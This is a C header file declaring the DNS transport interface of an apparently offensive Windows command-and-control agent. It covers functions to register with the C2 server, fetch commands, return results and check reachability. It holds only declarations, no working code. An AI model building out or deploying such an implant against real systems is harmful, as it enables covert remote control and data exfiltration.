/**
 * Transport.h - DNS transport for C2 Agent
 */

 #ifndef TRANSPORT_H
 #define TRANSPORT_H
 
 #include <windows.h>
 
 // Initialize the transport module
 BOOL dns_transport_init();
 
 // Clean up the transport module
 void dns_transport_cleanup();
 
 // Request a command from the C2 server
 char* dns_request_command(const char* agent_id, const char* domain);
 
 // Send command execution results back to the C2 server
 BOOL dns_send_result(const char* agent_id, const char* result_id, const char* result, const char* domain);
 
 // Check if the C2 server is reachable
 BOOL dns_check_server(const char* domain);
 
 // Register the agent with the C2 server
 char* dns_register_agent(const char* domain);
 
 #endif // TRANSPORT_H
 